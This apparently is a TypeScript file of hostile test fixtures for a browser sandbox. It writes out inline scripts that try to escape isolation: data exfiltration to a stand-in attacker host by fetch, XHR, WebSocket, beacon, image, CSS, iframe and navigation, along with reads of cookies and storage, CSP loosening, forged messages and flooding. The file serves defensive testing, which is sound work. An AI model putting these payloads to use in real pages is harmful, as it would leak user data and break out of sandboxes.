// Hostile fixtures: one program per break-out attempt (PLAN-v3-core 2.6, "Its security"). Each tries exactly one thing, and says what happened by
// `conduit.send('result', …)`. The check (web/scripts/surface-hostile.mjs, over web/bench-surface.html) runs every fixture in a real browser, against a
// listening server that records every request it is sent, and holds each to its `must`:
//   - `silent`: the server was never asked for anything (the path `/<name>`), whatever the program saw;
//   - `denied`: the program was refused (the result begins `blocked:`), or said nothing at all;
//   - `ended`: the host ended the surface (`held` is set) or kept it from reaching the page;
//   - `refused`: the host refused what the surface sent (counted in `refused`), and no event reached the stage beyond `events`.
// The fixtures are data, so the lesson view's own check can run the same ones against its program.

/** Where a fixture reaches for. The check listens here, on a port of its own. */
export const EVIL = 'http://127.0.0.1:4889';

export interface HostileFixture {
  readonly name: string;
  /** what it tries, in a sentence */
  readonly threat: string;
  /** the document: markup with an inline script, as the brain would write it */
  readonly source: string;
  readonly must: {
    /** at most this many picture asks may reach the host (the page's picture service); the rest are refused or never sent */
    readonly pictures?: number;
    readonly silent: boolean;
    /** the program is refused: its result begins `blocked:`; false where the attempt gives no result (a navigation) */
    readonly denied?: boolean;
    readonly ended?: 'navigated' | 'frozen';
    /** at most this many events may reach the stage; the rest were refused */
    readonly events?: number;
    /** at least this many messages were refused by the host */
    readonly refused?: number;
  };
  /** the fixture only means anything without the boot script's own removals (the policy alone) */
  readonly policyOnly?: boolean;
}

/** One attempt, wrapped: a value, or a promise of one. A refusal is `blocked:<error name>`; getting through is `RAN:<value>`. */
function attempt(code: string): string {
  return `<script>(function(){function out(v){conduit.send('result',String(v).slice(0,200))}try{var r=(function(){${code}})();if(r&&typeof r.then==='function')r.then(function(x){out('RAN:'+x)},function(e){out('blocked:'+(e&&e.name))});else out('RAN:'+r)}catch(e){out('blocked:'+(e&&e.name))}})();</script>`;
}

const net = (name: string, threat: string, code: string, policyOnly = false): HostileFixture => ({ name, threat, source: attempt(code), must: { silent: true, denied: true }, policyOnly });

export const HOSTILE: readonly HostileFixture[] = [
  // spams the picture call: the bridge and the host cap what reaches the picture service
  { name: 'picture-spam', threat: 'conduit.picture called in a loop, with huge or odd arguments', source: attempt(`var n=0;for(var i=0;i<200;i++){conduit.picture('coffee '+i,{w:1e9,h:-5}).then(function(p){if(p!==null)n++})}conduit.picture('x'.repeat(10000));return new Promise(function(res){setTimeout(function(){res('got '+n)},900)})`), must: { silent: true, pictures: 4 } },
  // sends data out
  net('fetch', 'fetch() an address with data in it', `return fetch('${EVIL}/fetch?d=secret').then(function(r){return r.status})`, true),
  net('xhr', 'XMLHttpRequest, synchronous', `var x=new XMLHttpRequest();x.open('GET','${EVIL}/xhr?d=secret',false);x.send();return x.status`, true),
  net('websocket', 'open a WebSocket', `var w=new WebSocket('ws://127.0.0.1:4889/websocket');return new Promise(function(res,rej){w.onopen=function(){res('open')};w.onerror=function(){rej({name:'SocketError'})};setTimeout(function(){rej({name:'Timeout'})},800)})`, true),
  net('eventsource', 'open an EventSource', `var e=new EventSource('${EVIL}/eventsource');return new Promise(function(res,rej){e.onopen=function(){res('open')};e.onerror=function(){rej({name:'SourceError'})};setTimeout(function(){rej({name:'Timeout'})},800)})`, true),
  // a beacon is queued and the browser refuses it afterwards (the console says so): the program is told `true`, and the server is never asked
  { name: 'beacon', threat: 'navigator.sendBeacon', source: attempt(`if(!navigator.sendBeacon)throw{name:'Missing'};return navigator.sendBeacon('${EVIL}/beacon','secret')`), must: { silent: true }, policyOnly: true },
  net('img', 'an <img> whose address carries data', `return new Promise(function(res,rej){var i=new Image();i.onload=function(){res('loaded')};i.onerror=function(){rej({name:'ImageError'})};i.src='${EVIL}/img?d=secret';setTimeout(function(){rej({name:'Timeout'})},800)})`),
  net('css-url', 'a CSS url() that asks for an address', `document.body.style.backgroundImage="url(${EVIL}/css-url?d=secret)";return new Promise(function(res,rej){setTimeout(function(){rej({name:'NoResult'})},500)})`),
  net('script-src', 'load a script from an address', `return new Promise(function(res,rej){var s=document.createElement('script');s.src='${EVIL}/script-src.js';s.onload=function(){res('loaded')};s.onerror=function(){rej({name:'ScriptError'})};document.body.appendChild(s);setTimeout(function(){rej({name:'Timeout'})},800)})`),
  net('stylesheet', 'a <link rel=stylesheet> from an address', `return new Promise(function(res,rej){var l=document.createElement('link');l.rel='stylesheet';l.href='${EVIL}/stylesheet.css';l.onload=function(){res('loaded')};l.onerror=function(){rej({name:'LinkError'})};document.head.appendChild(l);setTimeout(function(){rej({name:'Timeout'})},800)})`),
  net('font', 'an @font-face from an address', `var s=document.createElement('style');s.textContent="@font-face{font-family:x;src:url(${EVIL}/font.woff2)}body{font-family:x}";document.head.appendChild(s);return document.fonts.load('16px x').then(function(f){if(!f.length)throw{name:'NoFont'};return 'loaded'})`),
  // the frame's load event fires for the browser's own error page: what matters is that the server is never asked
  { name: 'iframe', threat: 'an <iframe> onto an address', source: attempt(`return new Promise(function(res,rej){var f=document.createElement('iframe');f.src='${EVIL}/iframe';f.onload=function(){res('loaded')};document.body.appendChild(f);setTimeout(function(){rej({name:'Timeout'})},800)})`), must: { silent: true } },
  net('worker', 'a Worker', `var w=new Worker('${EVIL}/worker.js');return new Promise(function(res,rej){w.onerror=function(){rej({name:'WorkerError'})};setTimeout(function(){rej({name:'Timeout'})},800)})`, true),
  net('dynamic-import', 'import() of an address', `return import('${EVIL}/import.js').then(function(){return 'loaded'})`),
  net('webrtc', 'an RTCPeerConnection (a side door the policy has no word for)', `if(typeof RTCPeerConnection==='undefined')throw{name:'Removed'};var p=new RTCPeerConnection({iceServers:[{urls:'stun:127.0.0.1:4889'}]});p.createDataChannel('x');return p.createOffer().then(function(o){return p.setLocalDescription(o)}).then(function(){return 'offer'})`),
  net('form-submit', 'submit a form to an address', `var f=document.createElement('form');f.action='${EVIL}/form-submit';f.method='post';document.body.appendChild(f);f.submit();return new Promise(function(res,rej){setTimeout(function(){rej({name:'NoNavigation'})},500)})`),
  // navigates itself or the page
  { name: 'self-navigation', threat: 'location.href set to an address with data in it', source: attempt(`location.href='${EVIL}/self-navigation?d=secret';return 'navigating'`), must: { silent: true } },
  { name: 'link-click', threat: 'click a link to an address', source: `<a id="a" href="${EVIL}/link-click?d=secret">go</a>${attempt(`document.getElementById('a').click();return 'clicked'`)}`, must: { silent: true } },
  { name: 'meta-refresh', threat: 'a <meta http-equiv=refresh> added by script', source: attempt(`var m=document.createElement('meta');m.httpEquiv='refresh';m.content='0;url=${EVIL}/meta-refresh';document.head.appendChild(m);return 'added'`), must: { silent: true } },
  { name: 'meta-refresh-source', threat: 'a <meta http-equiv=refresh> written in the document', source: `<meta http-equiv="refresh" content="0;url=${EVIL}/meta-refresh-source">${attempt(`return 'written'`)}`, must: { silent: true } },
  { name: 'base-href', threat: 'a <base href> that points links at an address', source: `<base href="${EVIL}/base-href/"><a id="a" href="x">go</a>${attempt(`document.getElementById('a').click();return 'clicked'`)}`, must: { silent: true } },
  { name: 'top-navigation', threat: 'top.location set to an address', source: attempt(`top.location='${EVIL}/top-navigation';return 'assigned'`), must: { silent: true, denied: true } },
  { name: 'top-read', threat: 'read top.location.href', source: attempt(`return top.location.href`), must: { silent: true, denied: true } },
  { name: 'window-open', threat: 'window.open an address', source: attempt(`var w=window.open('${EVIL}/window-open');if(w===null)throw{name:'Blocked'};return 'WINDOW'`), must: { silent: true, denied: true } },
  { name: 'download', threat: 'start a download', source: attempt(`var a=document.createElement('a');a.href='data:text/plain,secret';a.download='x.txt';document.body.appendChild(a);a.click();return new Promise(function(res,rej){setTimeout(function(){rej({name:'NoDownload'})},400)})`), must: { silent: true, denied: true } },
  // reads what is not its own
  { name: 'parent-document', threat: 'read parent.document', source: attempt(`return parent.document.title`), must: { silent: true, denied: true } },
  { name: 'parent-cookie', threat: 'read the page\'s cookies through the parent', source: attempt(`return parent.document.cookie`), must: { silent: true, denied: true } },
  { name: 'parent-storage', threat: 'read the page\'s localStorage through the parent', source: attempt(`return parent.localStorage.length`), must: { silent: true, denied: true } },
  { name: 'document-cookie', threat: 'read document.cookie', source: attempt(`return document.cookie`), must: { silent: true, denied: true } },
  { name: 'local-storage', threat: 'localStorage', source: attempt(`return localStorage.length`), must: { silent: true, denied: true } },
  { name: 'session-storage', threat: 'sessionStorage', source: attempt(`return sessionStorage.length`), must: { silent: true, denied: true } },
  { name: 'indexed-db', threat: 'indexedDB', source: attempt(`return new Promise(function(res,rej){var r=indexedDB.open('x');r.onsuccess=function(){res('opened')};r.onerror=function(){rej({name:'DBError'})}})`), must: { silent: true, denied: true } },
  { name: 'clipboard', threat: 'read the clipboard', source: attempt(`return navigator.clipboard.readText()`), must: { silent: true, denied: true } },
  { name: 'geolocation', threat: 'ask for the position', source: attempt(`return new Promise(function(res,rej){navigator.geolocation.getCurrentPosition(function(){res('position')},function(e){rej({name:'Denied'+e.code})})})`), must: { silent: true, denied: true } },
  { name: 'camera', threat: 'ask for the camera', source: attempt(`return navigator.mediaDevices.getUserMedia({video:true})`), must: { silent: true, denied: true } },
  // changes its own rules
  { name: 'eval', threat: 'eval a string', source: attempt(`return eval('1+1')`), must: { silent: true, denied: true } },
  { name: 'new-function', threat: 'new Function', source: attempt(`return new Function('return 2')()`), must: { silent: true, denied: true } },
  { name: 'set-timeout-string', threat: 'setTimeout with a string', source: attempt(`window.__ran=0;setTimeout('window.__ran=1',0);return new Promise(function(res,rej){setTimeout(function(){if(window.__ran)res('the string ran');else rej({name:'NotRun'})},400)})`), must: { silent: true, denied: true } },
  { name: 'loosen-policy', threat: 'a document that brings its own, looser policy, then fetches', source: `<meta http-equiv="Content-Security-Policy" content="default-src *">${attempt(`return fetch('${EVIL}/loosen-policy').then(function(r){return r.status})`)}`, must: { silent: true, denied: true }, policyOnly: true },
  { name: 'modal', threat: 'alert() to cover the page', source: attempt(`var t=Date.now();alert('Allow?');return 'ignored in '+(Date.now()-t)+'ms'`), must: { silent: true } },
  // talks to the stage, wrongly
  { name: 'forged-message', threat: 'post a message with the wrong channel, and one with a wrong shape', source: attempt(`parent.postMessage({conduit:1,ch:'guess',type:'emit',name:'x',value:1,ask:true},'*');parent.postMessage({conduit:1,type:'save',json:'{}'},'*');parent.postMessage('emit','*');parent.postMessage({a:1},'*');return 'posted'`), must: { silent: true, events: 1, refused: 4 } },
  { name: 'ask-flood', threat: 'two hundred events in a burst', source: attempt(`for(var i=0;i<200;i++)conduit.ask('flood',i);return 'sent'`), must: { silent: true, events: 20, refused: 100 } },
  { name: 'huge-state', threat: 'a saved state of a hundred kilobytes', source: attempt(`conduit.state({a:new Array(100001).join('x')});return conduit.state()===null?'refused':'kept'`), must: { silent: true, events: 1 } },
  { name: 'odd-name', threat: 'an event whose name is markup', source: attempt(`conduit.send('<script>x',1);return 'sent'`), must: { silent: true, events: 2 } },
  // hangs or floods the page
  { name: 'busy-loop', threat: 'a loop that never ends', source: `<script>setTimeout(function(){while(true){}},300)</script>${attempt(`return 'started'`)}`, must: { silent: true, ended: 'frozen' } },
];
